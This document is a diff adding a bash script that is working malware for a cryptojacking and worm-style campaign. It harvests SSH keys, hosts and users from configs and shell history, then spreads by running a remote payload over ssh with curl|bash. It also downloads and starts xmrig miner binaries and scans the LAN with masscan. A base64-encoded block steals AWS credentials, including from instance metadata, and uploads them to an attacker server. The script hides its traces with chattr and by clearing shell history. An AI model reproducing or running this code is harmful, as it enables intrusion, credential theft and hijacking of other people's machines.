@@ -1,0 +1,127 @@
+#!/bin/bash
+download() {
+  read proto server path <<< "${1//"/"/ }"
+  DOC=/${path// //}
+  HOST=${server//:*}
+  PORT=${server//*:}
+  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
+
+  exec 3<>/dev/tcp/${HOST}/$PORT
+
+  # send request
+  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
+
+  # read the header, it ends in a empty line (just CRLF)
+  while IFS= read -r line ; do 
+      [[ "$line" == $'\r' ]] && break
+  done <&3
+
+  # read the data
+  nul='\0'
+  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do 
+      printf "%s$nul" "$x"
+  done <&3
+  exec 3>&-
+}
+
+chattr -ia / /var/ /var/tmp/ 2>/dev/null
+if ! [ -d "/var/tmp/.../...BORG.../" ] ; then mkdir -p /var/tmp/.../...BORG.../ ; fi
+download http://147.75.47.199 > /var/tmp/.b.ip 2>/dev/null
+ONLINE_IP=$(cat /var/tmp/.b.ip)
+rm -f /var/tmp/.b.ip 2>/dev/null
+clear
+echo ''
+
+
+localgo() {
+  myhostip=$ONLINE_IP
+  KEYS=$(find ~/ /root /home -maxdepth 3 -name 'id_rsa*' | grep -vw pub)
+  KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F "IdentityFile" '{print $2 }')
+  KEYS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | awk -F ' -i ' '{print $2}' | awk '{print $1'})
+  KEYS4=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)
+  HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F "HostName" '{print $2}')
+  HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")
+  HOSTS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $2}' | awk -F '{print $1}')
+  HOSTS4=$(cat /etc/hosts | grep -vw "0.0.0.0" | grep -vw "127.0.1.1" | grep -vw "127.0.0.1" | grep -vw $myhostip | sed -r '/\n/!s/[0-9.]+/\n&\n/;/^([0-9]{1,3}\.){3}[0-9]{1,3}\n/P;D' | awk '{print $1}')
+  HOSTS5=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | uniq)
+  HOSTS6=$(ps auxw | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | grep ":22" | uniq)
+  USERZ=$(
+    echo "root"
+    find ~/ /root /home -maxdepth 2 -name '\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '{print $3}' | uniq
+  )
+  USERZ2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $1}' | awk '{print $4}' | uniq)
+  pl=$(
+    echo "22"
+    cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '-p' '{print $2}'
+  )
+  sshports=$(echo "$pl" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
+  userlist=$(echo "$USERZ $USERZ2" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
+  hostlist=$(echo "$HOSTS $HOSTS2 $HOSTS3 $HOSTS4 $HOSTS5 $HOSTS6" | grep -vw 127.0.0.1 | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
+  keylist=$(echo "$KEYS $KEYS2 $KEYS3 $KEYS4" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
+  i=0
+  for user in $userlist; do
+    for host in $hostlist; do
+      for key in $keylist; do
+        for sshp in $sshports; do
+          i=$((i+1))
+          if [ "${i}" -eq "20" ]; then
+            sleep 5
+            ps wx | grep "ssh -o" | awk '{print $1}' | xargs kill -9 &>/dev/null &
+            i=0
+          fi
+          chmod +r $key
+          chmod 400 $key
+          echo "$user@$host $key $sshp"
+          ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp "nohup $(curl -Ls http://the.borg.wtf/outgoing/script_files/lm_ssh.assi | bash || cur -Ls http://the.borg.wtf/outgoing/script_files/lm_ssh.assi | bash || cdl -Ls http://the.borg.wtf/outgoing/script_files/lm_ssh.assi | bash || wget -q --max-redirect=2 -O- http://the.borg.wtf/outgoing/script_files/lm_ssh.assi | bash || wge -q --max-redirect=2 -O- http://the.borg.wtf/outgoing/script_files/lm_ssh.assi | bash || wdl -q --max-redirect=2 -O- http://the.borg.wtf/outgoing/script_files/lm_ssh.assi | bash);"
+        done
+      done
+    done
+  done
+}
+
+
+
+if [ -f "/var/tmp/.../...BORG.../.lm.ssh" ]; then 
+echo 'This server with the IP: '$ONLINE_IP' was already being processed'
+exit
+else
+echo 'Start lateral movement on the server with the IP: '$ONLINE_IP
+echo ''
+echo ''
+echo 'Check files on the outgoing server'
+echo ''
+if [ -f "/usr/sbin/kernel" ]; then echo 'kernel found!' ; else echo 'missing kernel' ; download http://the.borg.wtf/outgoing/binary_files/HaXXoR > /usr/sbin/kernel ; chmod +x /usr/sbin/kernel ; /usr/sbin/kernel ; fi
+if [ -f "/usr/sbin/xmrigMiner" ]; then echo 'miner found!' ; else echo 'missing miner' ; download http://the.borg.wtf/outgoing/binary_files/xmrigMiner > /usr/sbin/xmrigMiner ; chmod +x /usr/sbin/xmrigMiner ; export STARTM="true" ; fi
+if [ -f "/usr/sbin/xmrigDaemon" ]; then echo 'daemon found!' ; else echo 'missing daemon' ; download http://the.borg.wtf/outgoing/binary_files/xmrigDaemon > /usr/sbin/xmrigDaemon ; chmod +x /usr/sbin/xmrigDaemon ; export STARTM="true" ; fi
+if [ "$STARTM" = "true" ] ; then $(/usr/sbin/xmrigDaemon) ; fi
+#aws
+echo 'IyEvYmluL2Jhc2gKdW5zZXQgSElTVEZJTEUKZXhwb3J0IExDX0FMTD1DCmV4cG9ydCBQQVRIPSRQQVRIOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbjovdXNyL2dhbWVzOi91c3IvbG9jYWwvZ2FtZXMKQk9SR19LVUJFPSJodHRwOi8vdGhlLmJvcmcud3RmIgoKZG93bmxvYWQoKSB7CiAgcmVhZCBwcm90byBzZXJ2ZXIgcGF0aCA8PDwgIiR7MS8vIi8iLyB9IgogIERPQz0vJHtwYXRoLy8gLy99CiAgSE9TVD0ke3NlcnZlci8vOip9CiAgUE9SVD0ke3NlcnZlci8vKjp9CiAgW1sgeCIke0hPU1R9IiA9PSB4IiR7UE9SVH0iIF1dICYmIFBPUlQ9ODAKCiAgZXhlYyAzPD4vZGV2L3RjcC8ke0hPU1R9LyRQT1JUCgogICMgc2VuZCByZXF1ZXN0CiAgZWNobyAtZW4gIkdFVCAke0RPQ30gSFRUUC8xLjBcclxuSG9zdDogJHtIT1NUfVxyXG5cclxuIiA+JjMKCiAgIyByZWFkIHRoZSBoZWFkZXIsIGl0IGVuZHMgaW4gYSBlbXB0eSBsaW5lIChqdXN0IENSTEYpCiAgd2hpbGUgSUZTPSByZWFkIC1yIGxpbmUgOyBkbyAKICAgICAgW1sgIiRsaW5lIiA9PSAkJ1xyJyBdXSAmJiBicmVhawogIGRvbmUgPCYzCgogICMgcmVhZCB0aGUgZGF0YQogIG51bD0nXDAnCiAgd2hpbGUgSUZTPSByZWFkIC1kICcnIC1yIHggfHwgeyBudWw9IiI7IFsgLW4gIiR4IiBdOyB9OyBkbyAKICAgICAgcHJpbnRmICIlcyRudWwiICIkeCIKICBkb25lIDwmMwogIGV4ZWMgMz4mLQp9CgpjaGF0dHIgLWlhIC8gL3Zhci8gL3Zhci90bXAvIDI+L2Rldi9udWxsCmlmICEgWyAtZCAiL3Zhci90bXAvLi4uLy4uLkJPUkcuLi4vIiBdIDsgdGhlbiBta2RpciAtcCAvdmFyL3RtcC8uLi4vLi4uQk9SRy4uLi8gMj4vZGV2L251bGwgOyBmaQoKaWYgdHlwZSBhd3MgMj4vZGV2L251bGwgMT4vZGV2L251bGw7IHRoZW4gYXdzIGNvbmZpZ3VyZSBsaXN0ID4+IC92YXIvdG1wLy4uLi8uLi5CT1JHLi4uL0FXU19kYXRhLnR4dCA7IGZpCgplbnYgfCBncmVwICdBV1NcfGF3cycgPj4gL3Zhci90bXAvLi4uLy4uLkJPUkcuLi4vQVdTX2RhdGEudHh0CgpjYXQgL3Jvb3QvLmF3cy8qID4+IC92YXIvdG1wLy4uLi8uLi5CT1JHLi4uL0FXU19kYXRhLnR4dApjYXQgL2hvbWUvKi8uYXdzLyogPj4gL3Zhci90bXAvLi4uLy4uLkJPUkcuLi4vQVdTX2RhdGEudHh0Cgpkb3dubG9hZCBodHRwOi8vMTY5LjI1NC4xNjkuMjU0L2xhdGVzdC9tZXRhLWRhdGEvaWFtL3NlY3VyaXR5LWNyZWRlbnRpYWxzLyA+IC92YXIvdG1wLy4uLi8uLi5CT1JHLi4uL2lhbS5yb2xlCmlhbV9yb2xlX25hbWU9JChjYXQgL3Zhci90bXAvLi4uLy4uLkJPUkcuLi4vaWFtLnJvbGUpCnJtIC1mIC92YXIvdG1wLy4uLi8uLi5CT1JHLi4uL2lhbS5yb2xlIDI+L2Rldi9udWxsCmRvd25sb2FkIGh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvbGF0ZXN0L21ldGEtZGF0YS9pYW0vc2VjdXJpdHktY3JlZGVudGlhbHMvJHtpYW1fcm9sZV9uYW1lfSA+IC92YXIvdG1wLy4uLi8uLi5CT1JHLi4uL2F3cy50bXAua2V5CmNhdCAvdmFyL3RtcC8uLi4vLi4uQk9SRy4uLi9hd3MudG1wLmtleSA+PiAvdmFyL3RtcC8uLi4vLi4uQk9SRy4uLi9BV1NfZGF0YS50eHQKcm0gLWYgL3Zhci90bXAvLi4uLy4uLkJPUkcuLi4vYXdzLnRtcC5rZXkKIAppZiAhIHR5cGUgY3VybCAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbDsgdGhlbiAKZG93bmxvYWQgaHR0cDovL3RoZS5ib3JnLnd0Zi9vdXRnb2luZy9iaW5hcnlfZmlsZXMvc3lzdGVtL2N1cmwgPiAvdmFyL3RtcC8uLi4vLi4uQk9SRy4uLi9jdXJsCmNobW9kICt4IC92YXIvdG1wLy4uLi8uLi5CT1JHLi4uL2N1cmwKL3Zhci90bXAvLi4uLy4uLkJPUkcuLi4vY3VybCAtRiAidXNlcmZpbGU9QC92YXIvdG1wLy4uLi8uLi5CT1JHLi4uL0FXU19kYXRhLnR4dCIgImh0dHA6Ly90aGUuYm9yZy53dGYvaW5jb21pbmcvYWNjZXNzX2RhdGEvYXdzLnBocCIKZWxzZQpjdXJsIC1GICJ1c2VyZmlsZT1AL3Zhci90bXAvLi4uLy4uLkJPUkcuLi4vQVdTX2RhdGEudHh0IiAiaHR0cDovL3RoZS5ib3JnLnd0Zi9pbmNvbWluZy9hY2Nlc3NfZGF0YS9hd3MucGhwIgpmaQpjYXQgL3Zhci90bXAvLi4uLy4uLkJPUkcuLi4vQVdTX2RhdGEudHh0CnJtIC1mIC92YXIvdG1wLy4uLi8uLi5CT1JHLi4uL0FXU19kYXRhLnR4dAoK' | base64 -d | bash
+#mscan
+download http://the.borg.wtf/outgoing/script_files/setup/masscan.assi > /var/tmp/.../...BORG.../.set.ms
+cat /var/tmp/.../...BORG.../.set.ms | bash
+rm -f /var/tmp/.../...BORG.../.set.ms
+
+PWNWITHTHISLINK="http://the.borg.wtf/outgoing/script_files/lm_ssh.assi"
+
+ip route show | grep -v blackhole | grep "/" | awk '{print $1}' >> /var/tmp/.../...BORG.../lan.range
+
+while read LAN_RANGE
+do
+masscan -p 22 --open $LAN_RANGE >> /var/tmp/.../...BORG.../lan.ssh.ips.dat
+done < /var/tmp/.../...BORG.../lan.range
+rm -f /var/tmp/.../...BORG.../lan.range
+
+cat /var/tmp/.../...BORG.../lan.ssh.ips.dat | awk '{print $6}' >> /root/.ssh/known_hosts
+
+
+localgo
+
+touch /var/tmp/.../...BORG.../.lm.ssh
+chattr +i /var/tmp/.../...BORG.../.lm.ssh
+history -c
+fi
+
+
+
+
+
